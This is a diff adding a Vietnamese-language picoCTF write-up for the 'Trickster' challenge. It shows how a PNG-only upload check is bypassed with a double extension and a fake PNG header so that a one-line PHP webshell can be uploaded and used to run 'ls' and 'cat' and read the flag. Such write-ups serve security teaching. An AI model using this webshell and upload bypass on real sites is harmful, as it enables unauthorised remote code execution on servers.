@@ -446,3 +446,59 @@ Vào file `477ce.html`, chúng ta lụm được flag:
 ### Flag
 
 `picoCTF{ca1cu1at1ng_Mach1n3s_477ce}`
+
+## Trickster
+
+> Author: Junias Bonou
+>
+> I found a web app that can help process images: PNG images only!
+
+### Solution
+
+Vào URL của thử thách, chúng ta có một trang web cho phép tải lên file:
+
+![image](images/trickster/image-1.png)
+
+Thử tải lên một file ảnh để kiểm tra:
+
+![image](images/trickster/image-2.png)
+
+File chúng ta tải lên sẽ được lưu ở `uploads`:
+
+![image](images/trickster/image-3.png)
+
+Bên dưới là POST request khi chúng ta tải lên file. Chú ý response headers, chúng ta thấy server Apache với PHP phiên bản 8.0.30:
+
+![image](images/trickster/image-4.png)
+
+Vậy chúng ta sẽ tải lên một webshell PHP với tên `shell.php`. Thêm payload sau vào nội dung file để có thể thực hiện RCE:
+
+```php
+<?=`$_GET[0]`?>
+```
+
+Gửi request, chúng ta thấy thông báo lỗi tên file không chứa `.png`:
+
+![image](images/trickster/image-5.png)
+
+Chúng ta có thể bypass bằng cách sử dụng tên file là `shell.png.php`. Tuy nhiên, lại có một thông báo lỗi mới là file không phải ảnh PNG hợp lệ:
+
+![image](images/trickster/image-6.png)
+
+Do đó, chúng ta sẽ thêm `PNG` vào nội dung file để bypass và tải lên webshell thành công:
+
+![image](images/trickster/image-7.png)
+
+Giờ truy cập tới `/uploads/shell.png.php?0`, chúng ta có thể thực thi lệnh.
+
+Với lệnh `ls ..`, chúng ta thấy có một file đáng nghi là `GQ4DOOBVMMYGK.txt`:
+
+![image](images/trickster/image-8.png)
+
+Đọc file đó với lệnh `cat ../G*`, chúng ta lụm flag thành công:
+
+![image](images/trickster/image-9.png)
+
+### Flag
+
+`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_48785c0e}`
